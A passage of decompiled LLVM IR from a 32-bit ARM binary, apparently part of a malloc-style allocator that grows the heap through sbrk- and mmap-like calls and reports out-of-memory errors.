  %v1_106fc = add i32 %v3_106f0, 4
  %v2_106fc = inttoptr i32 %v1_106fc to i32*
  %v3_106fc = load i32, i32* %v2_106fc, align 4
  store i32 %v3_106fc, i32* %r1.global-to-local, align 4
  %v1_10704 = urem i32 %v3_106f4, 2
  %v2_10704 = icmp eq i32 %v1_10704, 0
  %v1_10700 = add i32 %v1_10708, 16
  %v2_10708 = add i32 %v1_10700, %v3_106f8
  store i32 %v2_10708, i32* %r3.global-to-local, align 4
  %v1_1070c = and i32 %v3_106fc, -4
  store i32 %v1_1070c, i32* @r8, align 4
  br i1 %v2_10704, label %bb153, label %bb152

bb152:                                            ; preds = %dec_label_pc_106e4
  %v3_10710 = sub i32 %v2_10708, %v1_1070c
  store i32 %v3_10710, i32* %r3.global-to-local, align 4
  br label %bb153

bb153:                                            ; preds = %dec_label_pc_106e4, %bb152
  %v0_10714 = phi i32 [ %v2_10708, %dec_label_pc_106e4 ], [ %v3_10710, %bb152 ]
  %v1_10714 = load i32, i32* %sb.global-to-local, align 4
  %v2_10714 = add i32 %v1_10714, %v0_10714
  store i32 %v2_10714, i32* %r3.global-to-local, align 4
  %v1_10718 = sub i32 -1, %v1_10714
  store i32 %v1_10718, i32* %fp.global-to-local, align 4
  %v2_1071c = and i32 %v2_10714, %v1_10718
  store i32 %v2_1071c, i32* @r5, align 4
  %tmp154 = icmp slt i32 %v2_1071c, 1
  br i1 %tmp154, label %dec_label_pc_10740, label %dec_label_pc_1072c

dec_label_pc_1072c:                               ; preds = %bb153
  store i32 %v2_1071c, i32* %r0.global-to-local, align 4
  %v1_10730 = call i32 @function_12c60(i32 %v2_1071c)
  store i32 %v1_10730, i32* %r0.global-to-local, align 4
  %v3_10734 = icmp eq i32 %v1_10730, -1
  store i32 %v1_10730, i32* @r4, align 4
  br i1 %v3_10734, label %dec_label_pc_10740, label %dec_label_pc_107ac

dec_label_pc_10740:                               ; preds = %dec_label_pc_1072c, %bb153
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %r1.global-to-local, align 4
  %v4_10748 = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_10748, i32* %r6.global-to-local, align 4
  %v1_1074c = add i32 %v4_10748, 864
  %v2_1074c = inttoptr i32 %v1_1074c to i32*
  %v3_1074c = load i32, i32* %v2_1074c, align 4
  store i32 %v3_1074c, i32* %r3.global-to-local, align 4
  %v1_10750 = urem i32 %v3_1074c, 2
  %v2_10750 = icmp eq i32 %v1_10750, 0
  br i1 %v2_10750, label %.thread29thread-pre-split, label %bb155

bb155:                                            ; preds = %dec_label_pc_10740
  %v1_10754 = load i32, i32* @r8, align 4
  %v2_10754 = load i32, i32* %sb.global-to-local, align 4
  %v3_10754 = add i32 %v2_10754, %v1_10754
  %v2_10758 = load i32, i32* @r5, align 4
  %v3_10758 = add i32 %v3_10754, %v2_10758
  store i32 %v3_10758, i32* %r3.global-to-local, align 4
  %v2_1075c = load i32, i32* %fp.global-to-local, align 4
  %v3_1075c = and i32 %v2_1075c, %v3_10758
  store i32 %v3_1075c, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_10740
  %v0_10760.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_10760 = phi i32 [ %v0_10760.pr, %.thread29thread-pre-split ], [ %v3_1075c, %bb155 ]
  %v2_10760 = icmp ugt i32 %v0_10760, 1048575
  br i1 %v2_10760, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_10778 = phi i32 [ %v0_10760, %.thread29 ], [ 1048576, %bb156 ]
  %v1_10768 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_10778, %v1_10768
  br i1 %tmp214, label %dec_label_pc_10770, label %dec_label_pc_109d4

dec_label_pc_10770:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_10778, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_1078c = call i32 @function_12978(i32 0, i32 %v0_10778, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_1078c, i32* %r0.global-to-local, align 4
  %v3_10790 = icmp eq i32 %v6_1078c, -1
  %v8_10790 = icmp eq i32 %v6_1078c, -1
  store i32 %v6_1078c, i32* @r4, align 4
  br i1 %v8_10790, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_10770
  %v1_10798 = load i32, i32* %r6.global-to-local, align 4
  %v2_10798 = add i32 %v1_10798, 864
  %v3_10798 = inttoptr i32 %v2_10798 to i32*
  %v4_10798 = load i32, i32* %v3_10798, align 4
  %v2_1079c = load i32, i32* @r5, align 4
  %v3_1079c = add i32 %v2_1079c, %v6_1078c
  store i32 %v3_1079c, i32* %r0.global-to-local, align 4
  %v2_107a0 = and i32 %v4_10798, -2
  store i32 %v2_107a0, i32* %r3.global-to-local, align 4
  store i32 %v2_107a0, i32* %v3_10798, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_10770, %bb158
  br i1 %v3_10790, label %dec_label_pc_107ac, label %dec_label_pc_107b0

dec_label_pc_107ac:                               ; preds = %.thread32, %dec_label_pc_1072c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_107b0

dec_label_pc_107b0:                               ; preds = %.thread32, %dec_label_pc_107ac
  %v0_107b0 = load i32, i32* @r4, align 4
  %v7_107b0 = icmp eq i32 %v0_107b0, -1
  br i1 %v7_107b0, label %dec_label_pc_109d4, label %dec_label_pc_107b8

dec_label_pc_107b8:                               ; preds = %dec_label_pc_107b0
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %r2.global-to-local, align 4
  %v4_107c0 = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_107c0, i32* %ip.global-to-local, align 4
  store i32 %v3_106f0, i32* %r2.global-to-local, align 4
  %v1_107c8 = add i32 %v4_107c0, 872
  %v2_107c8 = inttoptr i32 %v1_107c8 to i32*
  %v3_107c8 = load i32, i32* %v2_107c8, align 4
  %v1_107cc = load i32, i32* @r8, align 4
  %v2_107cc = add i32 %v1_107cc, %v3_106f0
  store i32 %v2_107cc, i32* %r1.global-to-local, align 4
  %v0_107d0 = load i32, i32* @r5, align 4
  %v2_107d0 = add i32 %v0_107d0, %v3_107c8
  store i32 %v2_107d0, i32* %r3.global-to-local, align 4
  %v9_107d4 = icmp eq i32 %v0_107b0, %v2_107cc
  br i1 %v9_107d4, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_107b8
  store i32 %v2_107d0, i32* %v2_107c8, align 4
  br label %dec_label_pc_107f0

bb159:                                            ; preds = %dec_label_pc_107b8
  %v1_107d8 = load i32, i32* %r0.global-to-local, align 4
  %v8_107d8 = icmp eq i32 %v1_107d8, -1
  store i32 %v2_107d0, i32* %v2_107c8, align 4
  br i1 %v8_107d8, label %.thread34, label %dec_label_pc_107f0

.thread34:                                        ; preds = %bb159
  %v1_107e0 = load i32, i32* @r5, align 4
  %v2_107e0 = load i32, i32* @r8, align 4
  %v3_107e0 = add i32 %v2_107e0, %v1_107e0
  %v2_107e4 = or i32 %v3_107e0, 1
  store i32 %v2_107e4, i32* %r3.global-to-local, align 4
  %v2_107e8 = load i32, i32* %r2.global-to-local, align 4
  %v3_107e8 = add i32 %v2_107e8, 4
  %v4_107e8 = inttoptr i32 %v3_107e8 to i32*
  store i32 %v2_107e4, i32* %v4_107e8, align 4
  br label %dec_label_pc_10968

dec_label_pc_107f0:                               ; preds = %bb159, %.thread122
  %v0_107f4.pr = load i32, i32* @r8, align 4
  %v0_107f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_107f0 = add i32 %v0_107f0, 864
  %v2_107f0 = inttoptr i32 %v1_107f0 to i32*
  %v3_107f0 = load i32, i32* %v2_107f0, align 4
  store i32 %v3_107f0, i32* %r2.global-to-local, align 4
  %v2_107f4 = icmp eq i32 %v0_107f4.pr, 0
  br i1 %v2_107f4, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_107f0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_107f0
  %v2_107fc = urem i32 %v3_107f0, 2
  store i32 %v2_107fc, i32* %r3.global-to-local, align 4
  %v2_10800 = icmp eq i32 %v2_107fc, 0
  br i1 %v2_10800, label %.thread40, label %dec_label_pc_10808

dec_label_pc_10808:                               ; preds = %.thread36
  %v0_10808 = load i32, i32* @r4, align 4
  %v1_10808 = load i32, i32* %r1.global-to-local, align 4
  %v3_10808 = icmp ult i32 %v0_10808, %v1_10808
  br i1 %v3_10808, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_10808
  %v2_1080c = and i32 %v3_107f0, -2
  store i32 %v2_1080c, i32* %r3.global-to-local, align 4
  store i32 %v2_1080c, i32* %v2_107f0, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_10808, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %ip.global-to-local, align 4
  %v4_1081c = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_1081c, i32* @r7, align 4
  %v1_10820 = add i32 %v4_1081c, 864
  %v2_10820 = inttoptr i32 %v1_10820 to i32*
  %v3_10820 = load i32, i32* %v2_10820, align 4
  store i32 %v3_10820, i32* %r3.global-to-local, align 4
  %v1_10824 = urem i32 %v3_10820, 2
  store i32 %v1_10824, i32* @r6, align 4
  %v2_10824 = icmp eq i32 %v1_10824, 0
  br i1 %v2_10824, label %dec_label_pc_108b8, label %dec_label_pc_1082c

dec_label_pc_1082c:                               ; preds = %.thread40
  %v0_1082c = load i32, i32* @r8, align 4
  %v2_1082c = icmp eq i32 %v0_1082c, 0
  br i1 %v2_1082c, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_1082c
  %v2_10830 = add i32 %v4_1081c, 872
  %v3_10830 = inttoptr i32 %v2_10830 to i32*
  %v4_10830 = load i32, i32* %v3_10830, align 4
  store i32 %v4_10830, i32* %r2.global-to-local, align 4
  %v1_10834 = load i32, i32* %r1.global-to-local, align 4
  %v2_10834 = load i32, i32* @r4, align 4
  %v3_10834 = sub i32 %v2_10834, %v1_10834
  %v3_10838 = add i32 %v3_10834, %v4_10830
  store i32 %v3_10838, i32* %r3.global-to-local, align 4
  store i32 %v3_10838, i32* %v3_10830, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_1082c, %bb161
  %v0_10840 = load i32, i32* @r4, align 4
  %v1_10840 = urem i32 %v0_10840, 8
  store i32 %v1_10840, i32* %r3.global-to-local, align 4
  %v2_10840 = icmp eq i32 %v1_10840, 0
  br i1 %v2_10840, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_10844 = sub nsw i32 8, %v1_10840
  store i32 %v2_10844, i32* %r3.global-to-local, align 4
  %v3_10848 = add i32 %v2_10844, %v0_10840
  store i32 %v3_10848, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_10850 = phi i32 [ 0, %.thread43 ], [ %v2_10844, %bb162 ]
  %v1_1084c = load i32, i32* @r5, align 4
  %v2_1084c = add i32 %v1_1084c, %v0_10840
  store i32 %v2_1084c, i32* @r6, align 4
  %v1_10850 = load i32, i32* @r8, align 4
  %v2_10850 = add i32 %v2_1084c, %v0_10850
  %v2_10854 = add i32 %v2_10850, %v1_10850
  store i32 %v2_10854, i32* %r1.global-to-local, align 4
  %v1_10858 = load i32, i32* %sb.global-to-local, align 4
  %v2_10858 = add i32 %v1_10858, %v2_10854
  %v1_1085c = load i32, i32* %fp.global-to-local, align 4
  %v2_1085c = and i32 %v1_1085c, %v2_10858
  store i32 %v2_1085c, i32* %r2.global-to-local, align 4
  %v2_10860 = sub i32 0, %v2_1084c
  store i32 %v2_10860, i32* %r3.global-to-local, align 4
  %v2_10864 = sub i32 %v2_1085c, %v2_1084c
  store i32 %v2_10864, i32* @r5, align 4
  store i32 %v2_10864, i32* %r0.global-to-local, align 4
  br i1 %v2_10840, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_10840, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_10870 = call i32 @function_12c60(i32 %v2_10864)
  store i32 %v1_10870, i32* %r0.global-to-local, align 4
  %v3_10874 = icmp eq i32 %v1_10870, -1
  br i1 %v3_10874, label %dec_label_pc_1087c, label %dec_label_pc_1088c

dec_label_pc_1087c:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10880 = call i32 @function_12c60(i32 0)
  store i32 %v1_10880, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_108e4

dec_label_pc_1088c:                               ; preds = %bb164
  %v1_1088c = load i32, i32* @r4, align 4
  %v3_1088c = icmp ult i32 %v1_10870, %v1_1088c
  br i1 %v3_1088c, label %dec_label_pc_10894, label %dec_label_pc_108e4

dec_label_pc_10894:                               ; preds = %dec_label_pc_1088c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %r0.global-to-local, align 4
  %v4_1089c = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_1089c, i32* %r2.global-to-local, align 4
  %v1_108a0 = add i32 %v4_1089c, 864
  %v2_108a0 = inttoptr i32 %v1_108a0 to i32*
  %v3_108a0 = load i32, i32* %v2_108a0, align 4
  %v0_108a4 = load i32, i32* @r6, align 4
  store i32 %v0_108a4, i32* %r0.global-to-local, align 4
  %v1_108a8 = and i32 %v3_108a0, -2
  store i32 %v1_108a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_108a8, i32* %v2_108a0, align 4
  br label %dec_label_pc_108e4

dec_label_pc_108b8:                               ; preds = %.thread40
  %v0_108b8 = load i32, i32* %r0.global-to-local, align 4
  %v3_108b8 = icmp eq i32 %v0_108b8, -1
  br i1 %v3_108b8, label %dec_label_pc_108c0, label %dec_label_pc_108dc

dec_label_pc_108c0:                               ; preds = %dec_label_pc_108b8
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_108c4 = call i32 @function_12c60(i32 0)
  store i32 %v1_108c4, i32* %r0.global-to-local, align 4
  %v0_108c8 = load i32, i32* @r7, align 4
  %v1_108c8 = add i32 %v0_108c8, 872
  %v2_108c8 = inttoptr i32 %v1_108c8 to i32*
  %v3_108c8 = load i32, i32* %v2_108c8, align 4
  store i32 %v3_108c8, i32* %r2.global-to-local, align 4
  %v0_108cc = load i32, i32* @r4, align 4
  %v0_108d0 = load i32, i32* @r5, align 4
  %v2_108cc = add i32 %v3_108c8, %v1_108c4
  %v2_108d0 = sub i32 %v2_108cc, %v0_108cc
  %v2_108d4 = sub i32 %v2_108d0, %v0_108d0
  store i32 %v2_108d4, i32* %r3.global-to-local, align 4
  store i32 %v2_108d4, i32* %v2_108c8, align 4
  %v0_108e0.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_108dc

dec_label_pc_108dc:                               ; preds = %dec_label_pc_108b8, %dec_label_pc_108c0
  %v0_108e0 = phi i32 [ 0, %dec_label_pc_108b8 ], [ %v0_108e0.pre, %dec_label_pc_108c0 ]
  %v0_108dc = load i32, i32* @r4, align 4
  store i32 %v0_108dc, i32* @r7, align 4
  store i32 %v0_108e0, i32* @r5, align 4
  br label %dec_label_pc_108e4

dec_label_pc_108e4:                               ; preds = %dec_label_pc_1088c, %dec_label_pc_10894, %dec_label_pc_1087c, %dec_label_pc_108dc
  %v0_108e4 = load i32, i32* %r0.global-to-local, align 4
  %v7_108e4 = icmp eq i32 %v0_108e4, -1
  br i1 %v7_108e4, label %dec_label_pc_10968, label %dec_label_pc_108ec

dec_label_pc_108ec:                               ; preds = %dec_label_pc_108e4
  %v1_108ec = load i32, i32* @r5, align 4
  %v2_108ec = add i32 %v1_108ec, %v0_108e4
  %v0_108f0 = load i32, i32* @r7, align 4
  %v2_108f0 = sub i32 %v2_108ec, %v0_108f0
  %v1_108f4 = or i32 %v2_108f0, 1
  %v2_108f8 = add i32 %v0_108f0, 4
  %v3_108f8 = inttoptr i32 %v2_108f8 to i32*
  store i32 %v1_108f4, i32* %v3_108f8, align 4
  store i32 142964, i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_10904 = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_10904, i32* @r6, align 4
  %v1_10908 = add i32 %v4_10904, 872
  %v2_10908 = inttoptr i32 %v1_10908 to i32*
  %v3_10908 = load i32, i32* %v2_10908, align 4
  %v0_1090c = load i32, i32* @r8, align 4
  %v2_1090c = icmp eq i32 %v0_1090c, 0
  %v0_10910 = load i32, i32* @r5, align 4
  %v2_10910 = add i32 %v0_10910, %v3_10908
  store i32 %v2_10910, i32* %r3.global-to-local, align 4
  store i32 %v2_10910, i32* %v2_10908, align 4
  %v0_10918 = load i32, i32* @r7, align 4
  %v1_10918 = load i32, i32* @r6, align 4
  %v2_10918 = add i32 %v1_10918, 44
  %v3_10918 = inttoptr i32 %v2_10918 to i32*
  store i32 %v0_10918, i32* %v3_10918, align 4
  br i1 %v2_1090c, label %dec_label_pc_10968, label %dec_label_pc_10920

dec_label_pc_10920:                               ; preds = %dec_label_pc_108ec
  %v0_10924 = load i32, i32* @r8, align 4
  %v1_10924 = add i32 %v0_10924, -12
  %v1_10928 = and i32 %v1_10924, -8
  store i32 %v3_106f0, i32* %ip.global-to-local, align 4
  %v2_10930 = add i32 %v1_10928, %v3_106f0
  store i32 %v2_10930, i32* %r1.global-to-local, align 4
  %v2_10934 = icmp ugt i32 %v1_10928, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_1093c = or i32 %v1_10928, 1
  store i32 %v1_1093c, i32* %r3.global-to-local, align 4
  store i32 %v1_1093c, i32* %v2_106fc, align 4
  %v0_10944 = load i32, i32* %r2.global-to-local, align 4
  %v1_10944 = load i32, i32* %r1.global-to-local, align 4
  %v2_10944 = add i32 %v1_10944, 8
  %v3_10944 = inttoptr i32 %v2_10944 to i32*
  store i32 %v0_10944, i32* %v3_10944, align 4
  %v0_10948 = load i32, i32* %r2.global-to-local, align 4
  %v1_10948 = load i32, i32* %r1.global-to-local, align 4
  %v2_10948 = add i32 %v1_10948, 4
  %v3_10948 = inttoptr i32 %v2_10948 to i32*
  store i32 %v0_10948, i32* %v3_10948, align 4
  br i1 %v2_10934, label %dec_label_pc_10950, label %dec_label_pc_10968

dec_label_pc_10950:                               ; preds = %dec_label_pc_10920
  %v0_10950 = load i32, i32* @r6, align 4
  %v1_10950 = add i32 %v0_10950, 836
  %v2_10950 = inttoptr i32 %v1_10950 to i32*
  %v3_10950 = load i32, i32* %v2_10950, align 4
  store i32 %v3_10950, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_10958 = load i32, i32* %ip.global-to-local, align 4
  %v1_10958 = add i32 %v0_10958, 8
  store i32 %v1_10958, i32* @r0, align 4
  store i32 -1, i32* %v2_10950, align 4
  %v0_10960 = call i32 @function_11048()
  store i32 %v0_10960, i32* %r0.global-to-local, align 4
  %v0_10964 = load i32, i32* @r4, align 4
  %v1_10964 = load i32, i32* @r6, align 4
  %v2_10964 = add i32 %v1_10964, 836
  %v3_10964 = inttoptr i32 %v2_10964 to i32*
  store i32 %v0_10964, i32* %v3_10964, align 4
  br label %dec_label_pc_10968

dec_label_pc_10968:                               ; preds = %.thread34, %dec_label_pc_10920, %dec_label_pc_108ec, %dec_label_pc_108e4, %dec_label_pc_10950
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142964, i32* %r0.global-to-local, align 4
  %v4_10970 = load i32, i32* inttoptr (i32 142996 to i32*), align 4
  store i32 %v4_10970, i32* %lr.global-to-local, align 4
  %v1_10974 = add i32 %v4_10970, 872
  store i32 %v1_10974, i32* %r1.global-to-local, align 4
  %v1_10978 = inttoptr i32 %v1_10974 to i32*
  %v2_10978 = load i32, i32* %v1_10978, align 4
  store i32 %v2_10978, i32* %r1.global-to-local, align 4
  %v3_10978 = add i32 %v4_10970, 876
  %v4_10978 = inttoptr i32 %v3_10978 to i32*
  %v5_10978 = load i32, i32* %v4_10978, align 4
  store i32 %v5_10978, i32* %r3.global-to-local, align 4
  %v1_10980 = add i32 %v4_10970, 868
  %v2_10980 = inttoptr i32 %v1_10980 to i32*
  %v3_10980 = load i32, i32* %v2_10980, align 4
  store i32 %v3_10980, i32* %r3.global-to-local, align 4
  %v1_10984 = add i32 %v4_10970, 884
  %v2_10984 = inttoptr i32 %v1_10984 to i32*
  %v3_10984 = load i32, i32* %v2_10984, align 4
  store i32 %v3_10984, i32* %r2.global-to-local, align 4
  %v2_10988 = add i32 %v3_10980, %v2_10978
  store i32 %v2_10988, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_10978, %v5_10978
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_10968
  store i32 %v2_10978, i32* %v4_10978, align 4
  %v0_10990.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_10990.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_10968, %bb165
  %v1_10990 = phi i32 [ %v3_10984, %dec_label_pc_10968 ], [ %v1_10990.pre, %bb165 ]
  %v4_10994 = phi i32 [ %v2_10988, %dec_label_pc_10968 ], [ %v0_10990.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_10994, %v1_10990
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_10994 = load i32, i32* %lr.global-to-local, align 4
  %v6_10994 = add i32 %v5_10994, 884
  %v7_10994 = inttoptr i32 %v6_10994 to i32*
  store i32 %v4_10994, i32* %v7_10994, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_10998 = load i32, i32* %lr.global-to-local, align 4
  %v1_10998 = add i32 %v0_10998, 44
  %v2_10998 = inttoptr i32 %v1_10998 to i32*
  %v3_10998 = load i32, i32* %v2_10998, align 4
  store i32 %v3_10998, i32* %ip.global-to-local, align 4
  %v1_1099c = add i32 %v3_10998, 4
  %v2_1099c = inttoptr i32 %v1_1099c to i32*
  %v3_1099c = load i32, i32* %v2_1099c, align 4
  store i32 %v1_105b0, i32* %r1.global-to-local, align 4
  %v1_109a4 = and i32 %v3_1099c, -4
  store i32 %v1_109a4, i32* %r3.global-to-local, align 4
  %v3_109a8 = icmp ult i32 %v1_109a4, %v1_105b0
  br i1 %v3_109a8, label %dec_label_pc_109d4, label %dec_label_pc_109b0

dec_label_pc_109b0:                               ; preds = %bb168
  %v0_109b0 = load i32, i32* @sl, align 4
  %v2_109b0 = sub i32 %v1_109a4, %v0_109b0
  %v2_109b4 = add i32 %v0_109b0, %v3_10998
  store i32 %v2_109b4, i32* %r1.global-to-local, align 4
  %v1_109b8 = or i32 %v2_109b0, 1
  store i32 %v1_109b8, i32* %r3.global-to-local, align 4
  %v1_109bc = or i32 %v0_109b0, 1
  store i32 %v1_109bc, i32* %r2.global-to-local, align 4
  %v1_109c0 = add i32 %v3_10998, 8
  store i32 %v1_109c0, i32* %r0.global-to-local, align 4
  store i32 %v1_109bc, i32* %v2_1099c, align 4
  %v0_109c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_109c8 = load i32, i32* %lr.global-to-local, align 4
  %v2_109c8 = add i32 %v1_109c8, 44
  %v3_109c8 = inttoptr i32 %v2_109c8 to i32*
  store i32 %v0_109c8, i32* %v3_109c8, align 4
  %v0_109cc = load i32, i32* %r3.global-to-local, align 4
  %v1_109cc = load i32, i32* %r1.global-to-local, align 4
  %v2_109cc = add i32 %v1_109cc, 4
  %v3_109cc = inttoptr i32 %v2_109cc to i32*
  store i32 %v0_109cc, i32* %v3_109cc, align 4
  br label %dec_label_pc_109e4

dec_label_pc_109d4:                               ; preds = %bb157, %bb168, %dec_label_pc_107b0
  %v0_109d4 = call i32 @function_d0ec()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_109dc = inttoptr i32 %v0_109d4 to i32*
  store i32 12, i32* %v2_109dc, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_109e4

dec_label_pc_109e4:                               ; preds = %bb151, %bb150, %dec_label_pc_109b0, %dec_label_pc_105f8, %dec_label_pc_109d4
  %v0_109e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_109e4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_109e8

dec_label_pc_109e8:                               ; preds = %.thread1, %dec_label_pc_105c4, %.thread121, %dec_label_pc_10434, %dec_label_pc_10428, %dec_label_pc_10290, %dec_label_pc_10214, %dec_label_pc_109e4
  store i32 %v2_1013c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 142964, i32* %r2.global-to-local, align 4
  %v4_109f8 = load i32, i32* inttoptr (i32 142988 to i32*), align 4
  store i32 %v4_109f8, i32* @ip, align 4
  store i32 68100, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_109f8)
  br label %dec_label_pc_10a04

dec_label_pc_10a04:                               ; preds = %dec_label_pc_10174, %dec_label_pc_109e8
  %v0_10a04 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10a04, i32* %r0.global-to-local, align 4
  store i32 %v3_10110, i32* @r4, align 4
  store i32 %v6_10110, i32* @r5, align 4
  store i32 %v9_10110, i32* @r6, align 4
  store i32 %v12_10110, i32* @r7, align 4
  store i32 %v15_10110, i32* @r8, align 4
  store i32 %v18_10110, i32* @sb, align 4
  store i32 %v21_10110, i32* @sl, align 4
  store i32 %v24_10110, i32* @fp, align 4
  store i32 %v27_10110, i32* @lr, align 4
  ret i32 %v0_10a04

; uselistorder directives
  uselistorder i32 %v0_109b0, { 1, 0, 2 }
  uselistorder i32 %v3_10998, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10994, { 1, 0 }
  uselistorder i32 %v2_10978, { 2, 0, 1, 3 }
  uselistorder i32 %v4_10970, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_10928, { 1, 2, 0 }
  uselistorder i32 %v0_108f0, { 1, 0 }
  uselistorder i32 %v0_108e4, { 1, 0 }
  uselistorder i32 %v2_108d4, { 1, 0 }
  uselistorder i32 %v2_10864, { 2, 1, 0 }
  uselistorder i32 %v2_1084c, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10844, { 1, 0, 2 }
  uselistorder i32 %v1_10840, { 2, 1, 0 }
  uselistorder i32 %v0_10840, { 3, 1, 2, 0 }
  uselistorder i32 %v1_10824, { 1, 0 }
  uselistorder i32 %v2_107fc, { 1, 0 }
  uselistorder i32 %v3_107f0, { 1, 0, 2 }
  uselistorder i32 %v2_107d0, { 1, 0, 2 }
  uselistorder i32* %v2_107c8, { 1, 0, 2 }
  uselistorder i32 %v0_107b0, { 1, 0 }
  uselistorder i32 %v6_1078c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_10778, { 2, 1, 0 }
  uselistorder i32 %v0_10760, { 1, 0 }
  uselistorder i32 %v2_1071c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10718, { 1, 0 }
  uselistorder i32 %v3_106f0, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_106d0, { 1, 0, 2 }
  uselistorder i32 %v2_106b8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10660, { 2, 1, 0 }
  uselistorder i32 %v6_10654, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_10630, { 2, 1, 0, 3 }
  uselistorder i32 %v3_105f0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_105b0, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_105a8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_105a4, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_10590, { 1, 0 }
  uselistorder i32 %v7_10550, { 1, 0 }
  uselistorder i32 %v4_10550, { 1, 0 }
  uselistorder i32 %v0_10520, { 1, 0 }
  uselistorder i32 %v2_104f4, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_104f054, { 1, 0 }
  uselistorder i32 %v1_104bc, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_104a4., { 1, 2, 0 }
  uselistorder i32 %v0_104ac, { 0, 1, 3, 2 }
  uselistorder i32 %v1_104ac, { 1, 0 }
  uselistorder i32 %v3_1048c, { 1, 0 }
  uselistorder i32 %v4_10488, { 1, 0, 2 }
  uselistorder i32 %v1_103f8, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10450, { 1, 0 }
  uselistorder i32 %v1_10434, { 1, 0 }
  uselistorder i32 %v1_102d4, { 1, 0 }
  uselistorder i32 %v0_10414, { 2, 0, 1, 3 }
  uselistorder i32 %v3_103dc, { 2, 0, 1, 3 }
  uselistorder i32 %v0_10470.pre, { 1, 2, 0 }
  uselistorder i32 %v0_103b8, { 2, 1, 0 }
  uselistorder i32 %v3_103ac, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_102cc, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_10374, { 1, 0 }
  uselistorder i32 %v3_10368, { 1, 0 }
